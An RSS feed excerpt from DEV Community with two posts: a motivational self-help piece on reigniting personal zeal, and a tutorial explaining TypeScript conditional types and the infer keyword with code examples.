<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
  <channel>
    <title>DEV Community</title>
    <author>DEV Community</author>
    <description>A constructive and inclusive social network for software developers. With you every step of your journey.</description>
    <link>https://dev.to</link>
    <language>en</language>
    <item>
      <title>Tips to Ignite Your Zeal by Jacqueline Nagle</title>
      <author>Jacqueline Nagle</author>
      <pubDate>Mon, 22 Nov 2021 05:12:39 +0000</pubDate>
      <link>https://dev.to/jacquelinenagle/tips-to-ignite-your-zeal-by-jacqueline-nagle-og4</link>
      <guid>https://dev.to/jacquelinenagle/tips-to-ignite-your-zeal-by-jacqueline-nagle-og4</guid>
      <description>&lt;p&gt;Can a person be successful without the zeal or passion to do something? I doubt it! Businesses, CEOs, politicians, successful career men and women, the zeal to pursue it against all odds is what makes them who they are today. The fact is the journey to success is not always smooth. The pain, the struggles, the challenges, the disappointments and so much more are enough to make any man quit. Hence, the end goal becomes the focus, the zeal becomes the driver driving you through the rough road to your destination. &lt;/p&gt;

&lt;p&gt;But what happens when you lose that zeal? Well, it’s okay to be tired, weary, disappointed, and discouraged. It’s all part of human nature and even machines that tend to work like a clock sometimes require reignition once the power is turned off.  The good news is you can restore your passion. You can power your tenacity, that zeal can be reignited. &lt;a href="https://dev.to/jacquelinenagle"&gt;Jacqueline Nagle&lt;/a&gt;,  a passionate mentor, strategist and speaker is here to help you power up and remind you of how it all started. She shares these powerful tools to help you reignite your zeal. Keep reading!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Be grateful&lt;/strong&gt;&lt;br&gt;
Be thankful for life, for the people in your life, your achievements- pasts and presents, and all the goodness in your life. Being grateful makes you feel more positive about life, it relishes good experiences, and builds your mental and emotional health. When you are in a positive mood, even mountains that seem difficult to climb will be far easier for you. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;See mistakes as a teacher&lt;/strong&gt;&lt;br&gt;
So far you are progressing, mistakes are bound to happen. Expect them, learn from and move on. Easier said than done right? Well, mistakes are not really pleasant, but when you see them as the best teachers, you wouldn’t dwell too much on them. The point is one doesn’t always learn from success. Learning from others’ mistakes as well is great but when it’s your own mistakes, it hits deeper. However, it’s not the mistakes that matter. It’s how you handle it, what you learn from it, and how you apply that to your life. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Stay in the present&lt;/strong&gt;&lt;br&gt;
“Enough of mind wandering. Enough of always being on your phone and keeping up with others living on social media. Enough of worries and anxieties. These are what steal you of your moments, your presents and it all looks like you aren’t living at all, “Jacqueline Nagle advises. Although this might be difficult especially when you have a lot of things on your to-do lists, however, there are many benefits to this. You get to increase your focus, improve your memory and promote emotional health. Plus, if you’re caught up in all of these, it’s hard to get anything done. Caught out all distractions, take a deep breath, be mindful of your environment and enjoy the moment.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Finish what you started&lt;/strong&gt;&lt;br&gt;
Are you a starter or a finisher? You already know the race is for those that finish well and part of being successful is knowing how to finish what you started. If you have a lot of unfinished business i.e, a business you quit along the way, a project you got tired of, a course you never finished, chances are all these might dampen your enthusiasm and kill your zeal. Success breeds success, therefore, never quit anything until you see it to finish. Look at your past, what are the things that make you throw in the towel? How can you avoid them? Then, measure up your progress and get going. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Remain focused on your goal&lt;/strong&gt;&lt;br&gt;
Remember the purpose and what drives your passion. Remember what makes you get started in the first place and what you stand to gain when you reach your goal. Constantly remind yourself how great it will be and how you will feel when you get there. All these are enough reasons to get up and get drilling. Why do you start? What will you gain from it? &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Reward yourself for every win&lt;/strong&gt;&lt;br&gt;
Another thing to do is to break big challenges into chunks. Do it and watch your self-motivation increase. However, don’t just stop at that. Pat yourself on the back for every milestone achieved by rewarding yourself. It could be taking yourself out on a date. Reading a book you enjoy or treating yourself to a good spa. In other words, give yourself a good reward for those things you get completed. &lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Be inspired&lt;/strong&gt;&lt;br&gt;
Sometimes, everyone needs motivation and encouragement. The good thing is there are people around you whether online or offline who might have finished the same project that you are currently working on. There are those that can be regarded as &lt;a href="https://www.bncc.com.au/news/news-2018/august2018/featured-member-speakableyou/"&gt;mentors&lt;/a&gt;, who will be more than willing to share their success stories with you. You can also google those that you see as role models to know how they go about it. Read motivational quotes written by successful people. All these are sure to encourage you and get you to rise and put in the energy and enthusiasm you started with. &lt;/p&gt;

&lt;p&gt;These tips provided by Jacqueline Nagle are proven ways for self-motivation that will set you up for success. They will let you push through challenges, difficulties, pains and make it to the end goal. Hence, regularly check yourself to see if you are on the right track. If not, reignite and get your zeal running. The goal is to finish well and strong!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Originally published at &lt;a href="https://getjoys.net/lifestyle/ignite-your-zeal/"&gt;getjoys.net&lt;/a&gt;&lt;/em&gt;&lt;/strong&gt;&lt;/p&gt;

</description>
      <category>jacquelinenagle</category>
      <category>selfawareness</category>
      <category>selfworth</category>
      <category>passion</category>
    </item>
    <item>
      <title>Infer in TypeScript, the Great and Powerful</title>
      <author>Artem Malko</author>
      <pubDate>Mon, 22 Nov 2021 04:46:17 +0000</pubDate>
      <link>https://dev.to/artemmalko/infer-in-typescript-the-great-and-powerful-5cch</link>
      <guid>https://dev.to/artemmalko/infer-in-typescript-the-great-and-powerful-5cch</guid>
      <description>&lt;p&gt;Let's talk about the &lt;code&gt;infer&lt;/code&gt; keyword in TypeScript. I believe, there're a lot of developers, who've been confused about &lt;code&gt;infer&lt;/code&gt;. When should I use it? How it works? What is the purpose?&lt;/p&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--_f81DB7D--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pfnn335fcnpvohqi4ape.gif" class="article-body-image-wrapper"&gt;&lt;img src="https://res.cloudinary.com/practicaldev/image/fetch/s--_f81DB7D--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_66%2Cw_880/https://dev-to-uploads.s3.amazonaws.com/uploads/articles/pfnn335fcnpvohqi4ape.gif" alt="Confused developer" width="480" height="480"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Let's start with something easier. The next cases will help us to understand the concept of &lt;code&gt;infer&lt;/code&gt;. Ok, look at the piece of code:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;let&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;TypeScript infers a type quite smoothly — it's a number. This fact allows developers to not write such types everywhere. TypeScript takes care of it. By the way, where will be another type in case of &lt;code&gt;const&lt;/code&gt; usage. Try it by yourself. I'm waiting for your explanation in the comments. This is a small interactive with a reader)&lt;/p&gt;

&lt;p&gt;Ok, we've just found out, TypeScript is pretty smart. If a value corresponds to a specific condition, TS can make a decision about its type. Something like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;typeof&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;number&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kr"&gt;number&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="o"&gt;??&lt;/span&gt;&lt;span class="p"&gt;?;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;What does &lt;code&gt;???&lt;/code&gt; mean?) Meet the &lt;code&gt;never&lt;/code&gt; type. Looks quite useless, who'd like to use it? In TypeScript, &lt;code&gt;never&lt;/code&gt; is treated as the no value type. Do we have any functions, which do not return a value (undefined is a correct value)? By the way, we can create such function. For example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;foo&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;throw&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="nb"&gt;Error&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;error&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Check out the return type of &lt;code&gt;foo&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;Actually, the &lt;code&gt;never&lt;/code&gt; type is not so useless. Let's come back to that example with number. We can use &lt;code&gt;never&lt;/code&gt; in the else condition:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="k"&gt;typeof&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;number&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="kr"&gt;number&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt; &lt;span class="k"&gt;else&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;never&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="c1"&gt;// or&lt;/span&gt;

&lt;span class="k"&gt;typeof&lt;/span&gt; &lt;span class="nx"&gt;a&lt;/span&gt; &lt;span class="o"&gt;===&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;number&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt; &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="kr"&gt;number&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;never&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Of course, where is no such code in TypeScript's codebase. It's just a model, how TypeScript works. &lt;/p&gt;

&lt;p&gt;And there is an equivalent for if/else in TypeScript. I'm talking about the &lt;code&gt;extends&lt;/code&gt; keyword:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;NumberFromType&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;T&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;T&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="kr"&gt;number&lt;/span&gt; 
  &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="kr"&gt;number&lt;/span&gt; 
  &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;never&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Hm, there is something new — &lt;code&gt;&amp;lt;T&amp;gt;&lt;/code&gt;. Let's think about it like it is a box for a type. &lt;code&gt;T&lt;/code&gt; can be any type. We will put the type into that box as soon as it will be defined anywhere in your statement. The classic example:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;function&lt;/span&gt; &lt;span class="nx"&gt;test&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;T&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;T&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt; &lt;span class="nx"&gt;T&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;
  &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="nx"&gt;x&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="p"&gt;}&lt;/span&gt;

&lt;span class="nx"&gt;test&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;10&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;If you call it like &lt;code&gt;test(10);&lt;/code&gt;, TypeScript will defined &lt;code&gt;T&lt;/code&gt; as &lt;code&gt;number&lt;/code&gt;, cause &lt;code&gt;x&lt;/code&gt; was &lt;code&gt;number&lt;/code&gt;. This is quite simple explanation, I know. But it's enough right now) Ok, we can moving on.&lt;/p&gt;

&lt;p&gt;Let's come back to &lt;code&gt;NumberFromType&lt;/code&gt;. &lt;code&gt;T extends number&lt;/code&gt; means that it’s safe to assume that a value of type &lt;code&gt;T&lt;/code&gt; is also of type &lt;code&gt;number&lt;/code&gt;. For example, 10 extends &lt;code&gt;number&lt;/code&gt; because &lt;code&gt;let a: number = 10&lt;/code&gt; is type-safe. Hm, what happens, if we pass a string into &lt;code&gt;NumberFromType&amp;lt;T&amp;gt;&lt;/code&gt;? :&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;A&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;NumberFromType&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;10&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;

&lt;span class="c1"&gt;// It will be treated like this:&lt;/span&gt;

&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;NumberFromType&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;10&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="dl"&gt;'&lt;/span&gt;&lt;span class="s1"&gt;10&lt;/span&gt;&lt;span class="dl"&gt;'&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="kr"&gt;number&lt;/span&gt; &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="kr"&gt;number&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;never&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;As a result, there will be &lt;code&gt;never&lt;/code&gt; in the type &lt;code&gt;A&lt;/code&gt;, cause string is not extended from number. But what if we need to work with strings too? We can put one condition into another. Something like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;StringOrNumberFromType&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;T&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;T&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="kr"&gt;string&lt;/span&gt;
  &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="kr"&gt;string&lt;/span&gt;
  &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;T&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="kr"&gt;number&lt;/span&gt;
    &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="kr"&gt;number&lt;/span&gt;
    &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;never&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;And voila, it works for strings and numbers) So, you can go deeper and put more conditions there, for each of type.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#the-infer-keyword"&gt;
  &lt;/a&gt;
  The infer keyword
&lt;/h2&gt;

&lt;p&gt;Finally we are ready for &lt;code&gt;infer&lt;/code&gt;! First of, the &lt;code&gt;infer&lt;/code&gt; keyword can be used in conditional types only. And there is a really simple explanation — you can not use it anywhere else =) This keyword doesn't have any meanings outside of a conditional type. &lt;/p&gt;

&lt;p&gt;Ok, let's try to pass an array of numbers into &lt;code&gt;NumberFromType&lt;/code&gt;. The result is &lt;code&gt;never&lt;/code&gt;, obviously. An array of numbers is not extended from number. But what if we need to get a type of an array item? It can be something like this:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;ArrayItemType&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;T&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;T&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="p"&gt;...&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;What should go next in that statement? We need to check, that &lt;code&gt;T&lt;/code&gt; is an array:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;ArrayItemType&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;T&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;T&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="p"&gt;[]&lt;/span&gt; &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="p"&gt;...&lt;/span&gt; &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;never&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;I've just finished the condition, like it was in &lt;code&gt;NumberFromType&lt;/code&gt;. But the main question is not resolved, cause we need a type of the array's item. By the way, we can write a type for array of numbers like &lt;code&gt;number[]&lt;/code&gt; or &lt;code&gt;Array&amp;lt;number&amp;gt;&lt;/code&gt;. Any other type can be inside &lt;code&gt;&amp;lt;&amp;gt;&lt;/code&gt; braces. So, our condition can be written in a such way:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;ArrayItemType&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;T&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;T&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="nb"&gt;Array&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;ITEM_TYPE&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; 
  &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="nx"&gt;ITEM_TYPE&lt;/span&gt; 
  &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;never&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Ok, it's much better! But &lt;code&gt;ITEM_TYPE&lt;/code&gt; is not defined. It has not been inferred yet. Yes, we need TypeScript to infer the type. We can ask TypeScript to do it:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;ArrayItemType&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;T&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;T&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="nb"&gt;Array&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;infer&lt;/span&gt; &lt;span class="nx"&gt;ITEM_TYPE&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; 
  &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="nx"&gt;ITEM_TYPE&lt;/span&gt; 
  &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;never&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;It means, if &lt;code&gt;T&lt;/code&gt; is extended from an &lt;code&gt;Array&lt;/code&gt; type, so, TypeScript, it would be really kind of you, if you will infer the type of &lt;code&gt;T's&lt;/code&gt; item and will return it as a result.&lt;/p&gt;

&lt;p&gt;In general, we can say, that the &lt;code&gt;infer&lt;/code&gt; keyword and conditional typing in TypeScript allows us to take a type and isolate any piece of it for a later usage. &lt;/p&gt;

&lt;p&gt;There are some real life examples. &lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#unpromisify"&gt;
  &lt;/a&gt;
  Unpromisify
&lt;/h3&gt;



&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="k"&gt;export&lt;/span&gt; &lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;Unpromisify&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;T&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nx"&gt;T&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="nb"&gt;Promise&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;infer&lt;/span&gt; &lt;span class="nx"&gt;Result&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt; 
  &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="nx"&gt;Result&lt;/span&gt; 
  &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;never&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;As it follows from its name, &lt;code&gt;Unpromisify&amp;lt;T&amp;gt;&lt;/code&gt; returns a Promise's result. By the way, if you use TypeScript 4.5 or higher, you can use the built in type &lt;code&gt;Awaited&lt;/code&gt;. There are some examples with &lt;code&gt;Awaited&lt;/code&gt; on &lt;a href="https://www.typescriptlang.org/docs/handbook/release-notes/typescript-4-5.html#the-awaited-type-and-promise-improvements"&gt;typescriptlang.org&lt;/a&gt;.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#componentprops"&gt;
  &lt;/a&gt;
  ComponentProps
&lt;/h3&gt;

&lt;p&gt;In React, we often need to access prop types of a component. To do that, React offers a utility type for accessing prop types powered by the &lt;code&gt;infer&lt;/code&gt; keyword called &lt;code&gt;ComponentProps&lt;/code&gt;. You can find the full  definition in &lt;a href="https://github.com/DefinitelyTyped/DefinitelyTyped/blob/master/types/react/index.d.ts#L832"&gt;DefinitelyTyped repository&lt;/a&gt;.&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight typescript"&gt;&lt;code&gt;&lt;span class="kd"&gt;type&lt;/span&gt; &lt;span class="nx"&gt;ComponentProps&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;
    &lt;span class="nx"&gt;T&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="kr"&gt;keyof&lt;/span&gt; &lt;span class="nx"&gt;JSX&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;IntrinsicElements&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="nx"&gt;JSXElementConstructor&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="kr"&gt;any&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
  &lt;span class="o"&gt;&amp;gt;&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;
        &lt;span class="nx"&gt;T&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="nx"&gt;JSXElementConstructor&lt;/span&gt;&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nx"&gt;infer&lt;/span&gt; &lt;span class="nx"&gt;P&lt;/span&gt;&lt;span class="o"&gt;&amp;gt;&lt;/span&gt;
            &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="nx"&gt;P&lt;/span&gt;
            &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="nx"&gt;T&lt;/span&gt; &lt;span class="kd"&gt;extends&lt;/span&gt; &lt;span class="kr"&gt;keyof&lt;/span&gt; &lt;span class="nx"&gt;JSX&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;IntrinsicElements&lt;/span&gt;
                &lt;span class="p"&gt;?&lt;/span&gt; &lt;span class="nx"&gt;JSX&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;IntrinsicElements&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;T&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt;
                &lt;span class="p"&gt;:&lt;/span&gt; &lt;span class="p"&gt;{};&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;After checking that &lt;code&gt;T&lt;/code&gt; is a React component (&lt;code&gt;T extends keyof JSX.IntrinsicElements | JSXElementConstructor&amp;lt;any&amp;gt;&lt;/code&gt;), it infers its props and returns them (&lt;code&gt;T extends JSXElementConstructor&amp;lt;infer P&amp;gt; ? P&lt;/code&gt;). And the tail is about a simple React Element.&lt;/p&gt;

&lt;h2&gt;
  &lt;a href="#conclusion"&gt;
  &lt;/a&gt;
  Conclusion
&lt;/h2&gt;

&lt;p&gt;The &lt;code&gt;infer&lt;/code&gt; keyword is a powerful tool that allows us to unwrap and store types from any complex type. It is like a type unboxing. So, there is no any mystery behind this keyword.&lt;/p&gt;

&lt;p&gt;If you want challenge your TypeScript skills, I'd like to recommend you &lt;a href="https://github.com/type-challenges/type-challenges"&gt;type-challenges&lt;/a&gt;. And I'm pretty sure, this post will be really useful. Enjoy)&lt;/p&gt;

</description>
      <category>typescript</category>
      <category>webdev</category>
      <category>programming</category>
      <category>tutorial</category>
    </item>
    <item>
